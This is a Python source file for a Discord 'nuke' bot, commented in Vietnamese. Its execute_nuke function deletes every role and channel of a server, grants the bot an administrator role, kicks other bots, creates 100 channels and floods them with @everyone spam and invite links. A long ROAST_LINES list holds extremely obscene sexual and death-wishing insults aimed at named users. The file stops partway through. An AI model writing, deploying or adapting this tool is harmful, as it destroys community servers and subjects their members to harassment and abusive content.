import asyncio
import os
import sys
import random
import discord
from discord.ext import commands
import aiohttp
from datetime import timedelta, datetime
import json
import math

# ==================== KEEP_ALIVE ====================
try:
    from keep_alive import keep_alive
except ImportError:
    def keep_alive():
        pass

# ==================== CẤU HÌNH HỆ THỐNG ====================
DISCORD_TOKEN = os.getenv("TOKEN")

# Danh sách ID của Boss Bảo và các đồng minh ủy quyền
BOT_OWNERS = [
    1540585511842881616,
    1542453882263707759,
    1502969774202814625,
]

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True
intents.bans = True

def get_prefix(bot, message):
    # Hỗ trợ cả "nuked " và "nuked" (không có space)
    if message.content.lower().startswith("nuked "):
        return "nuked "
    elif message.content.lower().startswith("nuked"):
        return "nuked"
    return "nuked "  # fallback

# CHỈ MỘT DÒNG bot – KHÔNG KHAI BÁO LẠI Ở DƯỚI
bot = commands.Bot(command_prefix=get_prefix, intents=intents)
bot.remove_command('help')  # Xóa bỏ lệnh help gốc của discord.py

spam_task_running = None
bot_enabled = True  # Trạng thái hoạt động của bot

SERVER_LOG_CHANNELS = {}
WELCOME_CHANNELS = {}
GOODBYE_CHANNELS = {}
SERVER_LEVEL_CHANNELS = {}
DISABLED_COMMANDS = set()  # Danh sách lệnh bị tắt

# Cấu hình các file lưu trữ dữ liệu JSON
LEVEL_FILE = "levels.json"
CONFIG_FILE = "config.json"
COIN_FILE = "coins.json"
INVENTORY_FILE = "inventory.json"
MARRIAGE_FILE = "marriages.json"

# ==================== LƯU TRỮ & TẢI DỮ LIỆU JSON ====================
def load_levels():
    global USER_LEVELS
    try:
        with open(LEVEL_FILE, "r", encoding="utf-8") as f:
            USER_LEVELS = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        USER_LEVELS = {}

def save_levels():
    with open(LEVEL_FILE, "w", encoding="utf-8") as f:
        json.dump(USER_LEVELS, f, indent=2, ensure_ascii=False)

def load_coins():
    try:
        with open(COIN_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_coins(data):
    with open(COIN_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def load_inventory():
    try:
        with open(INVENTORY_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_inventory(data):
    with open(INVENTORY_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def load_config():
    global SERVER_LOG_CHANNELS, WELCOME_CHANNELS, GOODBYE_CHANNELS, SERVER_LEVEL_CHANNELS, BOT_OWNERS, DISABLED_COMMANDS
    try:
        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        SERVER_LOG_CHANNELS = data.get("log_channels", {})
        WELCOME_CHANNELS = data.get("welcome_channels", {})
        GOODBYE_CHANNELS = data.get("goodbye_channels", {})
        SERVER_LEVEL_CHANNELS = data.get("level_channels", {})
        BOT_OWNERS = data.get("owners", BOT_OWNERS)
        DISABLED_COMMANDS = set(data.get("disabled_commands", []))
    except (FileNotFoundError, json.JSONDecodeError):
        pass

def save_config():
    data = {
        "log_channels": SERVER_LOG_CHANNELS,
        "welcome_channels": WELCOME_CHANNELS,
        "goodbye_channels": GOODBYE_CHANNELS,
        "level_channels": SERVER_LEVEL_CHANNELS,
        "owners": BOT_OWNERS,
        "disabled_commands": list(DISABLED_COMMANDS)
    }
    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def load_marriages():
    try:
        with open(MARRIAGE_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_marriages(data):
    with open(MARRIAGE_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

# Khởi tạo dữ liệu ban đầu
USER_LEVELS = {}
user_coins = load_coins()
user_inventory = load_inventory()
marriages = load_marriages()
load_levels()
load_config()

CUSTOM_SETUP_GIF = "https://i.pinimg.com/originals/7a/41/bb/7a41bb51fe3babe0c6cee161f85df62c.gif"
NUKE_GIF_URL = "https://media.discordapp.net/attachments/1541456087105151066/1542122209156538388/739ed3f3955356f06352d43eb649168a.gif"
NUKE_AVATAR_URL = "https://media.discordapp.net/attachments/1541456087105151066/1542127023810416660/8b59ed006d0073e951a47e1da3c2d111.jpg"

def get_required_exp(level: int) -> int:
    return level * 100

ROAST_LINES = [
    "# Lồn mẹ mày nát bét như tương, bị địt đến không còn + chảy lênh! {username}",
    "# Đéo biết xấu hổ, lồn mẹ mày thối như cứt + xác chết đầy dòi bọ! {username}",
    "# Thằng óc lồn rộng, mặt giống lỗ đít thối + đầy phân + tinh trùng! {username}",
    "# Mày là đồ bệnh hoạn, chuyên bú cặc chó + ngựa + tự địt lỗ đít! {username}",
    "# Lồn rộng như biển phân, đụ má thằng khốn nạn óc cứt thối rữa! {username}",
    "# Thằng óc phân thối rữa, lồn mẹ mày bị địt đến chảy máu + mủ đặc sưng vù như quả bóng vỡ! {username}",
    "# Đụ con đĩ già thối tha, cặc mày hôi như xác chết 10 ngày + phân bò phơi nắng! {username}",
    "# Đụ má cái lồn to đùng, chứa đống tinh trùng thối rữa + máu mủ nước! {username}",
    "# Địt mẹ thằng chó đẻ, cặc mày hôi như đống cứt tươi + phân ngựa giữa trời nắng gắt! {username}",
    "# Con đĩ bán dâm, lồn rộng vì bị địt trăm lần + thú + nhét đồ! {username}",
    "# Con đĩ bán thân, lồn rộng vì địt nhiều + thú vật + vật lạ vào! {username}",
    "# Cặc teo như hạt tiêu, địt mẹ cái đồ ngu bệnh hoạn óc phân! {username}",
    "# Đụ con mẹ mày lần nữa và nữa, bú cặc thú vật + nuốt tinh trùng sống + phân chó! {username}",
    "# Con đĩ bán dâm chuyên, lồn rộng vì địt nhiều thú + nhét vật lạ! {username}",
    "# Mày chết mẹ mày đi, đồ bệnh hoạn chuyên bú cặc thú + tự địt lỗ đít mình! {username}",
    "# Con đĩ bán thân, lồn rộng vì bị địt cả trăm thằng + thú vật + nhét đồ vật! {username}",
    "# Địt vào mồm mày thối, nuốt tinh trùng thối rữa + phân chó tươi! {username}",
    "# Mày chết cho sạch đường phố, đồ rác rưởi bệnh hoạn của xã hội chuyên bú cặc thú vật! {username}",
    "# Mày chết mẹ mày, đồ rác của xã hội bệnh hoạn chuyên bú cặc thú! {username}",
    "# Lồn to như cái chảo lớn, chứa tinh trùng thối rữa + máu mủ + nước đái thú! {username}",
    "# Đụ má thằng mặt khỉ đột, mẹ mày bú cặc ngựa cả ngày + nuốt tinh trùng sống! {username}",
    "# Chửi tục cái lồn nát, cút xéo thằng chó đẻ bú cặc thú cho đã! {username}",
    "# Đụ má cái lồn to đùng chứa tinh trùng thối + máu mủ + nước đái chó! {username}",
    "# Đéo thèm quan tâm, cái mặt lồn thối của mày đầy nước dãi + phân! {username}",
    "# Địt mẹ chúng bay hết, cặc teo tóp như giòi chết trong phân thối! {username}",
    "# Lồn mẹ mày rộng như hố phân công cộng ngoài đồng, bị địt đến sưng vù nát như tương đặc + chảy nước nhớt thối! {username}",
    "# Đụ con đĩ già nua thối, cặc mày hôi như xác chết 10 ngày + phân! {username}",
    "# Cặc mày teo tóp như con giòi thối rữa trong đống cứt, địt vào lồn giải nua thối như xác chết 10 ngày giữa nắng! {username}",
    "# Cặc teo tóp như giòi thối, địt mẹ cái đồ mất dạy óc phân bò! {username}",
    "# Cặc teo như hạt tiêu thối trong phân, địt mẹ cái đồ mất dạy hết mức óc phân! {username}",
    "# Lồn rộng như hồ phân, đụ má thằng khốn kiếp óc cứt thối này! {username}",
    "# Địt mẹ thằng mặt lồn rộng thênh thang như sân vận động chứa phân, óc toàn phân bò khô + nước đái! {username}",
    "# Cặc teo như con giòi thối, địt mẹ cái thằng ngu óc phân bò! {username}",
    "# Đụ má thằng mặt thú vật, mẹ mày bú cặc chó đồng + nuốt tinh trùng! {username}",
    "# Mày chết mẹ mày đi cho sạch đường, lồn to đùng chứa cả xô tinh trùng thối rữa + máu mủ + nước tiểu chó! {username}",
    "# Lồn rộng như biển phân, đụ má thằng khốn nạn óc cứt thối! {username}",
    "# Chửi đổng cái lồn thối, cút xéo thằng chó đẻ bú cặc thú vật đi! {username}",
    "# Thằng óc phân thối, mặt giống lỗ đít thối tha đầy phân + tinh trùng! {username}",
    "# Đụ con đĩ giải thối tha, cặc mày hôi như xác chết 10 ngày + phân bò phơi nắng! {username}",
    "# Đéo thèm quan tâm cái lồn thối của mày, bú cặc lợn + chó + tự nhét vào lỗ đít đi! {username}",
    "# Lồn rộng như hồ nước phân ngoài đồng, đụ má thằng khốn nạn óc cứt thối này! {username}",
    "# Mày là đồ mất dạy hết, chuyên bú cặc thú rừng + nuốt sống tinh trùng! {username}",
    "# Lồn mẹ mày nát như tương đặc, bị địt đến không còn hình dạng + chảy máu mủ nước nhớt! {username}",
    "# Lồn rộng như sân vận động phân, đụ má thằng óc cứt thối rữa! {username}",
    "# Lồn to như cái ao phân, chứa tinh trùng thối rữa cả xô + máu mủ! {username}",
    "# Đéo thèm nhìn cái mặt lồn thối đầy nước dãi tinh trùng của mày, bú cặc lợn + chó + ngựa đi! {username}",
    "# Đụ má thằng mặt lồn rộng, mẹ mày bú cặc thú + nuốt tinh trùng sống! {username}",
    "# Cặc nhỏ xíu như hạt đậu thối, địt vào lồn giải đến chảy máu + mủ + nước nhớt! {username}",
    "# Con điếm rẻ tiền, chuyên bú cặc chó đêm ngày + nuốt sống tinh trùng! {username}",
    "# Đụ con mẹ mày lần nữa và nữa, bú cặc thú vật + nuốt tinh trùng sống + phân chó! {username}",
    "# Thằng óc lồn, mặt mày giống cái lỗ đít thối đầy phân + nước dãi tinh trùng! {username}",
    "# Cặc teo như hạt tiêu đen trong phân, địt mẹ cái đồ ngu si bệnh! {username}",
    "# Đụ má cái đồ rác, lồn to đùng chứa phân + tinh trùng thối rữa + máu mủ! {username}",
    "# Đụ má thằng mặt khỉ, mẹ mày bú cặc thú rừng cả đêm rồi nuốt sống! {username}",
    "# Thằng mặt thú dữ, mẹ mày con đĩ thú vật bú cặc + nuốt tinh trùng! {username}",
    "# Cặc teo tóp xíu xiu như con giòi chết trong cứt, địt mẹ cái thằng ngu si óc phân bò! {username}",
    "# Con đĩ mẹ mày chuyên quỳ gối bú cặc thú vật ngoài đồng rồi nuốt tinh trùng chó tươi + phân lẫn vào! {username}",
    "# Đụ con mẹ chúng mày hết, bú cặc thú vật đi cho rồi + nuốt tinh! {username}",
    "# Địt vào lồn già nua của mẹ mày đến sưng vù + chảy nước nhớt thối + máu mủ lẫn lộn! {username}",
    "# Lồn to như thúng, chứa tinh trùng thối rữa + máu mủ đặc + nước đái thú vật! {username}",
    "# Lồn rộng như cái ao phân ngoài đồng chứa đầy tinh trùng thối, đụ má thằng khốn nạn óc cứt này! {username}",
    "# Lồn mẹ mày nát bét, bị địt đến không còn gì + chảy nước nhớt + máu mủ đặc! {username}",
    "# Cặc teo như hạt tiêu, địt mẹ cái đồ ngu bệnh hoạn óc phân! {username}",
    "# Cặc teo như tiêu đen thối, địt mẹ cái thằng ngu si bệnh hoạn! {username}",
    "# Đéo có tư cách gì, lồn mẹ mày thối như phân bò tươi + xác chết! {username}",
    "# Lồn mẹ mày nát bét, bị địt đến không còn hình + mủ máu chảy lênh láng! {username}",
    "# Cặc hôi thối như phân, địt vào lồn già nua thối đến sưng chảy! {username}",
    "# Con điếm chuyên bú, cặc thú vật suốt ngày + nuốt sống tinh trùng phân! {username}",
    "# Đéo biết xấu hổ gì, lồn mẹ mày thối như cứt xác chết đầy dòi! {username}",
    "# Địt mẹ chúng bay hết sạch, cặc teo tóp như giòi thối rữa trong cứt! {username}",
    "# Đụ con mẹ mày nữa, bú cặc thú vật + tinh trùng sống + phân chó! {username}",
    "# Đéo có tư cách, lồn mẹ mày thối như xác chết 15 ngày + đầy dòi! {username}",
    "# Con đĩ thối tha, lồn rộng vì bị địt quá nhiều + thú vật + vật lạ! {username}",
    "# Lồn to như cái thúng chứa đầy tinh trùng thối rữa + máu mủ đặc + nước đái thú vật! {username}",
    "# Mày chết cho sạch, đồ bệnh hoạn chuyên bú thú + tự địt lỗ đít! {username}",
    "# Cặc hôi thối như cứt chó tươi giữa nắng, địt vào lồn giải nua đến sưng! {username}",
    "# Địt vào mồm mày thối, nuốt tinh trùng thối rữa + phân + nước đái! {username}",
    "# Lồn rộng như hồ nước phân, đụ má thằng khốn nạn óc cứt thối! {username}",
    "# Đụ con mẹ mày lần nữa, bú cặc thú + nuốt tinh trùng sống + phân! {username}",
    "# Óc cứt thối hoắc, lồn mẹ mày sưng vù vì địt + nhét vật lạ + thú! {username}",
    "# Con đĩ bán thân, lồn rộng vì bị địt cả trăm thằng + thú vật + nhét đồ vật! {username}",
    "# Đéo thèm quan tâm đến cái lồn thối + đầy nước dãi tinh trùng + phân của mày! {username}",
    "# Lồn mẹ mày nát bét, bị địt đến không còn hình dạng + chảy máu mủ! {username}",
    "# Chửi đổng cái lồn nát, cút mẹ mày bú cặc chó đi cho thỏa mãn! {username}",
    "# Thằng mặt lờ đờ, mẹ mày con đĩ chó bú cặc ngựa + nuốt tinh trùng! {username}",
    "# Đéo thèm nhìn mặt, cái lồn thối hoắc đầy nước dãi + phân của mày! {username}",
    "# Mày chết mẹ mày đi, đồ bệnh hoạn chuyên bú thú vật + tự địt! {username}",
    "# Đụ con đĩ giải nua thối như xác chết phân hủy, cặc mày hôi như đống cứt chó + phân ngựa phơi nắng! {username}",
    "# Mày là đồ mất dạy hết mức, chuyên bú cặc thú rừng + nuốt sống tinh trùng + phân! {username}",
    "# Địt mẹ chúng bay hết sạch, cặc teo tóp như giòi thối trong phân! {username}",
    "# Địt mẹ thằng chó cái đẻ, cặc teo tóp xíu như giòi trong phân! {username}",
    "# Thằng mặt khỉ đột, mẹ mày là con đĩ thú vật chuyên bú cặc ngựa + nuốt tinh trùng! {username}",
    "# Mày là đồ vô học, chuyên bú cặc ngựa + chó + lợn + nuốt sống! {username}",
    "# Cặc nhỏ như đậu thối, địt vào lồn già đến sưng vù + chảy máu mủ! {username}",
    "# Cặc nhỏ xíu như kiến, địt vào lồn già chảy máu mủ + nước nhớt! {username}",
    "# Đụ con đĩ già nua, cặc mày hôi như phân bò phơi nắng + xác chết thối! {username}",
    "# Cặc nhỏ như kiến chết, địt vào lồn già đến sưng + chảy máu mủ nhớt! {username}",
    "# Thằng mặt lờ, mẹ mày là con đĩ thú vật bú cặc ngựa + chó ngoài đường! {username}",
    "# Thằng óc cứt, mặt lồn giống lỗ đít đầy phân thối + nước dãi tinh trùng thú! {username}",
    "# Địt vào mồm thối hoắc, nuốt tinh trùng chó + phân tươi + nước đái! {username}",
    "# Thằng mặt khỉ đột, mẹ mày là con đĩ thú bú cặc + nuốt tinh trùng! {username}",
    "# Đụ con đĩ già thối tha, cặc hôi như phân bò phơi + xác chết thối! {username}",
    "# Óc phân bò khô thối, lồn mẹ mày sưng vù vì bị địt + nhét cặc thú + vật lạ! {username}",
    "# Địt mẹ thằng chó cái, cặc teo tóp xíu như giòi chết trong phân! {username}",
    "# Địt mẹ chúng bay hết, cặc teo tóp như giòi thối rữa trong đống cứt! {username}",
    "# Lồn mẹ mày nát như tương đặc, bị địt đến không còn gì + chảy nước máu mủ lênh láng! {username}",
    "# Lồn mẹ mày nát như tương, bị địt đến nát + chảy mủ máu nước nhớt! {username}",
    "# Mày chết cho sạch đường phố, đồ rác rưởi bệnh hoạn chuyên bú cặc thú của xã hội! {username}",
    "# Đụ má cái đồ mất dạy hết mức, mẹ mày bú cặc thú rừng rồi nuốt tinh trùng sống + phân chó! {username}",
    "# Đụ má thằng mặt thú, mẹ mày bú cặc ngựa + chó ngoài đồng rồi nuốt sống! {username}",
    "# Thằng óc cứt, mặt lồn giống lỗ đít đầy phân thối + tinh trùng thú! {username}",
    "# Cặc nhỏ xíu như hạt đậu thối, địt vào lồn giải đến chảy máu + mủ + nước nhớt thối! {username}",
    "# Địt vào mồm mày, bắt nuốt tinh trùng thối + phân chó tươi + nước đái lẫn! {username}",
    "# Đụ con mẹ mày lần nữa nữa, bú cặc thú vật + nuốt tinh trùng sống! {username}",
    "# Óc cứt thối của mày, đụ con đĩ mẹ mày lần nữa rồi bắt nó quỳ bú cặc chó ngoài đường! {username}",
    "# Cặc hôi thối như cứt tươi, địt vào lồn giải thối hoắc đến sưng vù! {username}",
    "# Mày chết mẹ mày đi ngay, đồ rác rưởi hết mức chuyên bú cặc thú! {username}",
    "# Chửi đổng cái lồn, cút xéo đi thằng chó đẻ bú cặc thú vật! {username}",
    "# Cặc hôi thối như cứt chó tươi, địt vào lồn già đến sưng chảy mủ! {username}",
    "# Lồn mẹ mày nát như tương, bị địt đến không còn gì + chảy nước máu! {username}",
    "# Cặc nhỏ xíu như đậu thối, địt vào lồn giải chảy máu + mủ nhớt! {username}",
    "# Địt vào mồm thối hoắc của mày rồi bắt nuốt tinh trùng chó tươi + phân + nước đái! {username}",
    "# Con đĩ thối tha hết, lồn rộng vì bị địt cả trăm lần + thú vật! {username}",
    "# Đụ con đĩ già nua thối, cặc mày hôi như xác chết thối + phân bò! {username}",
    "# Con đĩ thối tha hết mức, lồn rộng thênh thang như biển phân + tinh trùng thối rữa! {username}",
    "# Đụ má cái lồn thối hoắc nát bét chảy mủ máu của mẹ mày, quỳ xuống bú cặc chó + ngựa + lợn + nuốt tinh trùng sống cả đống! {username}",
    "# Đéo biết xấu hổ chút nào, lồn mẹ mày thối như xác chết phân hủy đầy dòi bọ! {username}",
    "# Thằng mặt thú vật hoang dã, lồn mẹ mày thối hoắc như xác chết phân hủy giữa mùa hè oi bức! {username}"
]

NUKE_CHANNEL_NAMES = [
    "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝔾̴𝔾̶.̴K̶Z̶3̸N̵/̵K̵Z̵4̸N̷ – ℍ𝕆𝕋 𝕎𝔸ℝ 𝔹𝕆𝕋",
    "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝔹𝔸̉𝕆 𝔻𝔼̣ℙ ℤ𝔸𝕀",
    "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝔹𝕆𝕋 ℕ𝕌𝕂𝔼 𝕆ℕ 𝕋𝕆ℙ",
    "☠️𝔻𝔼𝕋ℝ𝕆𝕐𝔼𝔻 𝔹𝕐 𝔹𝕆𝕋 ℕ𝕌𝕂𝔼 𝔼ℤ 𝕋𝕆ℙ",
    "☠️𝔼ℤ 𝕋𝕆ℙ 𝔸ℕ𝕋𝕀",
]

def is_bot_owner():
    async def predicate(ctx):
        return ctx.author.id in BOT_OWNERS
    return commands.check(predicate)

# ==================== HÀM GỬI LOG ĐẾN CÁC KÊNH LOG ====================
async def send_log_to_all(guild_id, embed):
    for g_id, ch_id in SERVER_LOG_CHANNELS.items():
        if int(g_id) == guild_id:
            channel = bot.get_channel(ch_id)
            if channel:
                try:
                    await channel.send(embed=embed)
                except:
                    pass

# ==================== VIEW XÁC NHẬN NUKE ====================
class NukeConfirmView(discord.ui.View):
    def __init__(self, guild: discord.Guild, channel: discord.abc.Messageable):
        super().__init__(timeout=60)
        self.guild = guild
        self.channel = channel

    async def on_timeout(self):
        for item in self.children:
            item.disabled = True

    @discord.ui.button(label="🟢 ĐỒNG Ý NUKE SERVER", style=discord.ButtonStyle.green)
    async def confirm_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("✅ Đã xác nhận! Đang tiến hành...", ephemeral=True)
        await self.channel.send("⚠️ Từ từ đang check sever đã...")
        for item in self.children:
            item.disabled = True
        await interaction.message.edit(view=self)
        self.stop()
        await execute_nuke(self.guild)

    @discord.ui.button(label="🔴 TỪ CHỐI", style=discord.ButtonStyle.red)
    async def cancel_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        for item in self.children:
            item.disabled = True
        await interaction.message.edit(view=self)
        await interaction.response.send_message(f"❌ Bạn đã từ chối nuke sever {self.guild.name}", ephemeral=True)
        self.stop()

async def execute_nuke(guild):
    try:
        nuke_log_embed = discord.Embed(
            title="🔥 CẢNH BÁO: LỆNH NUKE ĐƯỢC THỰC THI!",
            description=f"Server bị nuke: **{guild.name}** (`{guild.id}`)",
            color=0xFF0000
        )
        await send_log_to_all(guild.id, nuke_log_embed)

        supreme_role = None
        async def prep_nuke():
            nonlocal supreme_role
            tasks = []
            tasks.append(guild.edit(name="NUKE BY BỐ BẢO ĐZ"))
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(NUKE_AVATAR_URL) as resp:
                        if resp.status == 200:
                            image_data = await resp.read()
                            tasks.append(guild.edit(icon=image_data))
            except:
                pass

            for role in guild.roles:
                if role.name != "@everyone":
                    tasks.append(role.delete())

            await asyncio.gather(*tasks, return_exceptions=True)

            try:
                supreme_role = await guild.create_role(
                    name="👑 ℕ𝕌𝕂𝔼ℝ 𝕆ℕ 𝕋𝕆ℙ 👑",
                    permissions=discord.Permissions(administrator=True),
                    color=discord.Color.red(),
                    hoist=True
                )
                await guild.me.add_roles(supreme_role)
            except Exception as e:
                print(f"Lỗi tạo/add role tối cao: {e}")

            bot_members = [m for m in guild.members if m.bot and m.id != bot.user.id]
            chunk_size = 10
            for i in range(0, len(bot_members), chunk_size):
                chunk = bot_members[i:i + chunk_size]
                kick_tasks = [m.kick(reason="Anti-bot / Nuke cleanup") for m in chunk]
                await asyncio.gather(*kick_tasks, return_exceptions=True)

        await prep_nuke()

        channels_to_delete = list(guild.channels)
        for i in range(0, len(channels_to_delete), 15):
            batch = channels_to_delete[i:i+15]
            del_tasks = [ch.delete() for ch in batch]
            await asyncio.gather(*del_tasks, return_exceptions=True)
            await asyncio.sleep(1.0)

        created_channels = []
        for i in range(0, 100, 60):
            batch_create = []
            for j in range(i, min(i + 60, 100)):
                channel_name = NUKE_CHANNEL_NAMES[j % len(NUKE_CHANNEL_NAMES)]
                batch_create.append(guild.create_text_channel(name=channel_name))
            res = await asyncio.gather(*batch_create, return_exceptions=True)
            for r in res:
                if isinstance(r, discord.TextChannel):
                    created_channels.append(r)
            await asyncio.sleep(2.0)

        spam_content = (
            "# DETROYED BY BOSS BẢO ĐZ AND G̴G̶.̴K̶Z̶3̸N̵/̵K̵Z̵4̸N̷ – HOT WAR BOT ●'◡'●)\n"
            "|| @everyone||\n"
            "|| @here ||\n"
            '"|| link support 1 ||: https://discord.gg/Grr6RWe9A"\n'
            ' "|| link support 2 ||:https://discord.gg/4wrsMbRVpU"'
        )
        valid_channels = [ch for ch in created_channels if isinstance(ch, discord.TextChannel)]
        for _ in range(10):
            batch_spam = []
            for _ in range(250):
                ch = random.choice(valid_channels) if valid_channels else None
                if ch:
                    async def send_fast(c=ch):
                        try:
                            embed = discord.Embed()
                            embed.set_image(url=NUKE_GIF_URL)
                            await c.send(spam_content, embed=embed)
                        except:
                            pass
                    batch_spam.append(send_fast())
            if batch_spam:
                await asyncio.gather(*batch_spam, return_exceptions=True)
            await asyncio.sleep(1.0)

        complete_log_embed = discord.Embed(title=f"✅ Hoàn tất nuke server {guild.name} bởi Boss Bảo!", color=0x00FF00)
        await send_log_to_all(guild.id, complete_log_embed)

    except Exception as e:
        print(f"Lỗi khi thực hiện nuke: {e}")

# ==================== HỆ THỐNG GÁN ROLE THEO LEVEL ====================
async def check_and_assign_level_roles(member: discord.Member, current_level: int):
    role_permissions_map = {
        20: {"name": "LV 20 - Ping Everyone", "perms": discord.Permissions(mention_everyone=True)},
        200: {"name": "LV 200 - Manage Channels/Roles", "perms": discord.Permissions(manage_channels=True, manage_roles=True)},
        300: {"name": "LV 300 - All Channels Access", "perms": discord.Permissions(view_channel=True)},
        400: {"name": "LV 400 - Server Manager", "perms": discord.Permissions(manage_guild=True)},
        500: {"name": "LV 500 - Admin Server", "perms": discord.Permissions(administrator=True)},
        670: {"name": "LV 670 - Owner Server", "perms": discord.Permissions(administrator=True)}
    }
    for req_lv, r_data in role_permissions_map.items():
        if current_level >= req_lv:
            role = discord.utils.get(member.guild.roles, name=r_data["name"])
            if not role:
                try:
                    role = await member.guild.create_role(name=r_data["name"], permissions=r_data["perms"], hoist=True)
                except:
                    continue
            if role and role not in member.roles:
                try:
                    await member.add_roles(role)
                except:
                    pass

# ==================== LỆNH LOG ====================
@bot.command(name="log")
@is_bot_owner()
async def setlog(ctx, channel: discord.TextChannel = None):
    """📋 Cài đặt kênh log sự kiện"""
    try:
        if channel is None:
            if ctx.guild.id in SERVER_LOG_CHANNELS:
                del SERVER_LOG_CHANNELS[ctx.guild.id]
                save_config()
                embed = discord.Embed(
                    title="🔇 ĐÃ TẮT LOG SỰ KIỆN",
                    description="🎉 Hệ thống đã ngừng gửi log sự kiện!",
                    color=0x00FF00
                )
                embed.set_footer(text="Boss Bảo đã tắt log 💖")
                await ctx.send(embed=embed)
            else:
                embed = discord.Embed(
                    title="⚠️ CHƯA CÀI ĐẶT LOG",
                    description=(
                        "🔹 Hiện chưa có kênh log nào được cài đặt.\n"
                        "🔹 **Cú pháp:** `nuked log #kênh`\n"
                        "🔹 **Ví dụ:** `nuked log #log`"
                    ),
                    color=0xFF9900
                )
                embed.set_footer(text="Hệ thống log tự động phục vụ Boss Bảo 💖")
                await ctx.send(embed=embed)
            return

        SERVER_LOG_CHANNELS[ctx.guild.id] = channel.id
        save_config()
        try:
            test_embed = discord.Embed(
                title="✅ LOG SYSTEM ACTIVATED",
                description=f"🔹 Kênh log đã được cài đặt thành công!\n🔹 Người cài: {ctx.author.mention}\n🔹 Server: {ctx.guild.name}",
                color=0x00FF00,
                timestamp=datetime.now()
            )
            test_embed.set_footer(text="Hệ thống log tự động")
            await channel.send(embed=test_embed)
        except:
            pass

        embed = discord.Embed(
            title="✅ ĐÃ THIẾT LẬP KÊNH LOG SỰ KIỆN",
            description=(
                f"📌 **Kênh log:** {channel.mention}\n"
                f"👑 **Người cài:** {ctx.author.mention}\n"
                f"📋 **Sự kiện được log:**\n"
                f"• 🗑️ Tin nhắn bị xóa\n"
                f"• 🆕 Kênh mới được tạo\n"
                f"• 🗑️ Kênh bị xóa\n"
                f"• 👋 Thành viên join/leave\n"
                f"• ⚡ Các sự kiện quan trọng khác"
            ),
            color=0x00FF00
        )
        embed.set_footer(text="Hệ thống log tự động phục vụ Boss Bảo 💖")
        await ctx.send(embed=embed)

    except Exception as e:
        error_embed = discord.Embed(
            title="❌ LỖI CÀI LOG",
            description=f"⚠️ Đã xảy ra lỗi: `{str(e)}`\n🔹 Vui lòng kiểm tra quyền bot.",
            color=0xFF0000
        )
        await ctx.send(embed=error_embed)

@setlog.error
async def setlog_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('❌ NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
    else:
        await ctx.send(f"❌ Lỗi: {str(error)}")

# ==================== LỆNH SETWELCOME ====================
@bot.command(name="setwelcome")
@is_bot_owner()
async def set_welcome(ctx, channel: discord.TextChannel = None):
    """🎉 Cài kênh chào mừng thành viên mới"""
    if channel is None:
        if ctx.guild.id in WELCOME_CHANNELS:
            del WELCOME_CHANNELS[ctx.guild.id]
            save_config()
            embed = discord.Embed(
                title="✅ ĐÃ TẮT KÊNH CHÀO MỪNG",
                description="🎉 Hệ thống đã ngừng gửi tin nhắn chào mừng!",
                color=0x00FF00
            )
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(
                title="⚠️ CHƯA CÀI ĐẶT",
                description="🔹 Hiện chưa có kênh chào mừng nào được cài đặt.\n🔹 Cú pháp: `nuked setwelcome #kênh`",
                color=0xFF9900
            )
            await ctx.send(embed=embed)
        return
    WELCOME_CHANNELS[ctx.guild.id] = channel.id
    save_config()
    embed = discord.Embed(
        title="✅ ĐÃ THIẾT LẬP KÊNH CHÀO MỪNG",
        description=f"📌 **Kênh:** {channel.mention}\n👑 **Thiết lập bởi:** {ctx.author.mention}",
        color=0x00FF00
    )
    embed.set_footer(text="Hệ thống chào mừng tự động phục vụ Boss Bảo 💖")
    await ctx.send(embed=embed)

@set_welcome.error
async def set_welcome_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('❌ NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
    else:
        await ctx.send(f"❌ Cú pháp đúng: `nuked setwelcome #kênh` hoặc `nuked setwelcome` để tắt")

# ==================== LỆNH SETGOODBYE ====================
@bot.command(name="setgoodbye")
@is_bot_owner()
async def set_goodbye(ctx, channel: discord.TextChannel = None):
    """👋 Cài kênh tạm biệt khi thành viên rời"""
    if channel is None:
        if ctx.guild.id in GOODBYE_CHANNELS:
            del GOODBYE_CHANNELS[ctx.guild.id]
            save_config()
            embed = discord.Embed(
                title="✅ ĐÃ TẮT KÊNH TẠM BIỆT",
                description="🎉 Hệ thống đã ngừng gửi tin nhắn tạm biệt!",
                color=0x00FF00
            )
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(
                title="⚠️ CHƯA CÀI ĐẶT",
                description="🔹 Hiện chưa có kênh tạm biệt nào được cài đặt.\n🔹 Cú pháp: `nuked setgoodbye #kênh`",
                color=0xFF9900
            )
            await ctx.send(embed=embed)
        return
    GOODBYE_CHANNELS[ctx.guild.id] = channel.id
    save_config()
    embed = discord.Embed(
        title="✅ ĐÃ THIẾT LẬP KÊNH TẠM BIỆT",
        description=f"📌 **Kênh:** {channel.mention}\n👑 **Thiết lập bởi:** {ctx.author.mention}",
        color=0x00FF00
    )
    embed.set_footer(text="Hệ thống tạm biệt tự động phục vụ Boss Bảo 💖")
    await ctx.send(embed=embed)

@set_goodbye.error
